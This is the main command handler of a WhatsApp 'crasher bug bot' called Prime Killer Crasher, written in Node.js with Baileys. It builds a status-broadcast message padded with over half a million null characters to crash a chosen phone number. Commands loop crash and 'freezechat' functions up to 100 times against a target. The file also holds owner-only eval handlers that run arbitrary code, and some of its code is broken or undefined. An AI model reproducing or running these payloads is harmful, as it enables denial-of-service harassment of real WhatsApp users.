require('./setting');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const crypto = require("crypto");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = prim = async (prim, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? prim.user.id.split(":")[0] + "@s.whatsapp.net" || prim.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await prim.decodeJid(prim.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await prim.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = fs.readFileSync('./start/lib/media/primekiller.jpg')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Date: ${new Date().toLocaleString()} \n` +
`   ⌬ Message: ${m.body || m.mtype} \n` +
`   ⌬ Sender: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Group: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = fs.readFileSync('./start/lib/media/primekiller.jpg')

const bugres = 'Primis Crasher in processs...'
const cicitzy = 'This bug will not stop if you do not release the active source.'

// ғᴜɴᴄᴛɪᴏɴ ʀᴇᴘʟʏ

async function reply(teks) {
    prim.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        isForwarded: true
    }, {quoted: m})
}
const Reply1 = async (teks) => {
    await sleep(500);
    return prim.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝐏𝐫𝐢𝐦𝐢𝐬 𝐂𝐫𝐚𝐬𝐡𝐞𝐫`,
                body: `𝐏𝐫𝐢𝐦𝐢𝐬 𝐂𝐫𝐚𝐬𝐡𝐞𝐫`,
                previewType: "VIDEO",
                thumbnailUrl: `https://i.postimg.cc/L6CPdTdG/file-000000005f2c722f8ccf3dfe281cf45b.png`,
                sourceUrl: `https://chat.whatsapp.com/J67WrrOLyCTDyrt7RPPmh7`,
                mediaUrl: `https://chat.whatsapp.com/J67WrrOLyCTDyrt7RPPmh7`
            },
            isForwarded: false,
            forwardingScore: 99999
        }
    }, {
        quoted: m
    });
    await sleep(500);
async function galaxy(isTarget) {
  await prim.relayMessage("status@broadcast", {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: { 
            text: "🎭⃟༑⌁⃰P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉🐉",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(522500)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: true,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "༑ Fail Beta - ( P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉) \"👋\"",
              newsletterJid: "120363319314627296@newsletter",
              serverMessageId: 1
            },
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "©️ running since 2020 to 20##?",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: 'address_message',
                  paramsJson: "\u0000".repeat(522500),
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  }, {
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget }, content: [] }]
      }]
    }]
  });
}};


switch (command) {
 case 'delay-invis': {
if (!q) return Reply1(`\`Example:\` : ${prefix+command} 2547xxxxxxxx`);
X = text.split("|")[0]
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await prim.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await prim.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
Reply1(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉*`);
 for (let i = 0; i < 100; i++) {
    await delay1(isTarget);
    await CInVisible(isTarget, ptcp = true);
    await glxFrcInvisible(prim, isTarget);
    await InVisibleX(isTarget, ptcp = true);
    await gsglx(isTarget);
    await invisibleDozer(prim, isTarget);
    await galaxy(isTarget);
    await ExperimentDelay2(prim, isTarget, false)
    console.log(chalk.green(`Success Send Bug By P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉🐉`));
    await sleep(1000)
    }}

break; 
//======================

case 'testgc': {
await prim.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await prim.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
Reply1(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉*`);
await DocPay(m.chat)
    
    }
  
break;

case 'test3': {
if (!q) return Reply1(`\`Example:\` : ${prefix+command} 2547xxxxxxxx`);
X = text.split("|")[0]
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
await prim.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await prim.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
Reply1(`\`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️\`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉*`);
for (let r = 0; r < 50; r++) {
await freezechat(prim, target)
}
    
    }
  
break;

//======================

case 'public': {
if (!Access) return Reply1(mess.owner) 
if (prim.public === true) return Reply1("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
prim.public = true
Reply1(mess.succes)
}
break

//======================

case 'self': {
if (!Access) return Reply1(mess.owner) 
if (prim.public === false) return Reply1("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
prim.public = false
Reply1(mess.succes)
}
break

//======================

case 'menu':
case 'prim': {
await prim.sendMessage(m.chat, { react: { text: `⏳`, key: m.key }})
await prim.sendMessage(m.chat, { react: { text: `☠️`, key: m.key }})
const teks = `
ʜɪ 👋, *${pushname}!* ᴡᴇʟᴏᴍᴇ ᴛᴏ P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉

*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*
> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIME KILLER CRASHER*
> ┃🐉│ ᴠᴇʀsɪᴏɴ: *6.0.0*
> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *KENT*
> ┃🐉│ ᴘʀᴇғɪx: *${prefix}*
> ┃🐉│ ᴛʏᴘᴇ: *MENU*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ 🐉⛧ＰＲＩＭΞ⛧ ᛕΙᄂᄂΞＲ ⛧CЯΛSᕼΞЯ⛧ ɃЦ₲ ɃØŦ 🐉 ━━┓*
> ┃🐉│ ➤ *${prefix}owner-menu*
> ┃🐉│ ➤ *${prefix}other-menu*
> ┃🐉│ ➤ *${prefix}bug-menu*
> ┃🐉│ ➤ *${prefix}bug-menu2*
> ┃🐉│ ➤ *${prefix}bug-menu3*
> ┃🐉│ ➤ *${prefix}bug-group
> ┃🐉│ ➤ *${prefix}tqto*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

> © *Powered By P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉*
`
const image = 'https://i.postimg.cc/L6CPdTdG/file-000000005f2c722f8ccf3dfe281cf45b.png';
await prim.sendMessage(m.chat, {
image: { url: image },
caption: teks
}, { quoted: m });
prim.sendMessage(m.chat, {audio: fs.readFileSync('./media/primekiller.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

//======================

case 'script': case 'sc': {
await prim.sendMessage(m.chat, { react: { text: `⏳`, key: m.key }})
await prim.sendMessage(m.chat, { react: { text: `☠️`, key: m.key }})
const teks = `
*🐉🐉🐉 Need the bot file? Don’t worry!*  
You can easily find it through our official channels 🐉. Everything is well organized so you can access the file quickly, with no fake or broken links 🐉.

📌 Here’s where to get it:

🔗 *WhatsApp Channels:*  
• https://chat.whatsapp.com/J67WrrOLyCTDyrt7RPPmh7
• https://whatsapp.com/channel/0029VbBomL6BadmclMvXLI0P

👥 *WhatsApp Group:*  
• https://chat.whatsapp.com/J67WrrOLyCTDyrt7RPPmh7

📣 *Telegram Channel:*  
• https://t.me/primekillercrasher

💬 *Telegram Group:*  
• https://t.me/primekillercrasherv1

Thanks for your support 🐉.

> *Powered By P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉*
`
const image = 'https://i.postimg.cc/L6CPdTdG/file-000000005f2c722f8ccf3dfe281cf45b.png'; 
await prim.sendMessage(m.chat, {
image: { url: image },
caption: teks
}, { quoted: m });
prim.sendMessage(m.chat, {audio: fs.readFileSync('./media/primekiller.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

//======================

case 'dev': {
await prim.sendMessage(m.chat, { react: { text: `⏳`, key: m.key }})
await prim.sendMessage(m.chat, { react: { text: `☠️`, key: m.key }})
const teks = `
╔═════ ∘◦ ✧ ◦∘ ═════╗
👨‍💻 P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉ – ғᴜʟʟsᴛᴀᴄᴋ
╚═════ ∘◦ ✧ ◦∘ ═════╝

> 🧠 *sᴋɪʟʟᴇᴅ ɪɴ :*
⚙️ *ᴊᴀᴠᴀsᴄʀɪᴘᴛ | ɴᴏᴅᴇ.ᴊs | ʀᴇᴀᴄᴛ | ᴍᴏɴɢᴏᴅʙ*
📱 *ʙᴏᴛ ᴅᴇᴠ (ᴡʜᴀᴛsᴀᴘᴘ | ɢɪᴛʜᴜʙ)*
🌐 *ᴀᴘɪ ɪɴᴛᴇ́ɢʀᴀᴛɪᴏɴ & ᴀᴜᴛᴏᴍᴀᴛɪᴏɴ*

🛠️ *ᴘᴀssɪᴏɴᴀᴛᴇ ᴀʙᴏᴜᴛ ʙᴜɪʟᴅɪɴɢ ᴄʟᴇᴀɴ, ғᴀsᴛ ᴀɴᴅ sᴄᴀʟᴀʙʟᴇ sʏsᴛᴇᴍs*
🧩 *ᴀʟᴡᴀʏs ᴘᴜsʜɪɴɢ ʟɪᴍɪᴛs – ᴄᴏᴅᴇ ɪs ɴᴏᴛ ᴊᴜsᴛ sʏɴᴛᴀx, ɪᴛ's ᴀʀᴛ.*

📲 *ғᴏʟʟᴏᴡ ᴍʏ ᴄʜᴀɴɴᴇʟ ᴡʜᴀᴛsᴀᴘᴘ* :
🔗 https://whatsapp.com/channel/0029VbBomL6BadmclMvXLI0P
☎️ ᴄᴏɴᴛᴀᴄᴛ ᴍᴇ
🔗 https://t.me/Handsome_primis_killer_kent

> © *Powered By P҉r҉i҉m҉e҉ ✞ kîllér ✞ K҉e҉n҉t҉*
`
const image = 'https://i.postimg.cc/L6CPdTdG/file-000000005f2c722f8ccf3dfe281cf45b.png';
await prim.sendMessage(m.chat, {
image: { url: image },
caption: teks
}, { quoted: m });
prim.sendMessage(m.chat, {audio: fs.readFileSync('./media/primekiller.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

//======================

case 'addprem': {
if (!Access) return Reply1(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return Reply1(`where is the number and how many days do you want? example : ${prefix + command} @tag|30d`)
    if (!hari) return Reply1(`How many days do you want?`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return Reply1('lol, the owner is free')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return Reply1('Suscesfully add premium')
    let data = await prim.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('Suscesfully add premium')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://i.postimg.cc/L6CPdTdG/file-000000005f2c722f8ccf3dfe281cf45b.png`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VbBomL6BadmclMvXLI0P'
                }	
            }	
        };	
        return prim.sendMessage(m.chat, contentText, { quoted: m })
    } else {		
         Reply1("not found")
    }	
}
break

//======================

case 'delprem': {
if (!Access) return Reply1(mess.owner)
    if (!args[0]) return Reply1(`who wants to be ${command}? use numbers/tags, example : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return Reply1("this is not a premium user")
    let data = await prim.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        Reply1('the user has been deleted')
    } else {	
        Reply1("not found")
    }
}
break

        case 'ping':
                          case 'p':
  await prim.sendMessage(from, { react: { text: '🚀', key: m.key } });
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await prim.sendMessage(jid, {text: 'wait..'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await prim.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;

case 'left': {
                await prim.sendMessage(m.chat, { react: { text: "🏃", key: m.key } });
  // Vérification propriétaire
  if (!isPremium) return Reply1(mess.premium);
  
  // Vérification groupe
  if (!isGroup) return Reply1(mess.group);

  const groupName = prim.subject || "This group";
  
  // 1. Annonce du départ
  await Reply1(`🚪 The bot to leave the group  ${groupName}...`);
  
  // 2. Quitter immédiatement
  await prim.groupLeave(m.chat);
}
break

//======================

case 'tagall':
                await prim.sendMessage(m.chat, { react: { text: "🗣️", key: m.key } });
                if (!isGroup) return Reply1(mess.group)
                let teks = `*👥 ᴛᴀɢ ᴀʟʟ ʙʏ P҉r҉i҉m҉e҉ ✞ K҉i҉l҉l҉e҉r҉ ✞ C҉r҉a҉s҉h҉e҉r҉ ✞ B҉u҉g҉ B҉o҉t҉*
 
                 🗞️ *ᴍᴇssᴀɢᴇ : ${q ? q : 'ʙʟᴀɴᴋ'}*\n\n`
                for (let mem of participants) {
                    teks += `🌹 @${mem.id.split('@')[0]}\n`
                }
                prim.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
                
//======================

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
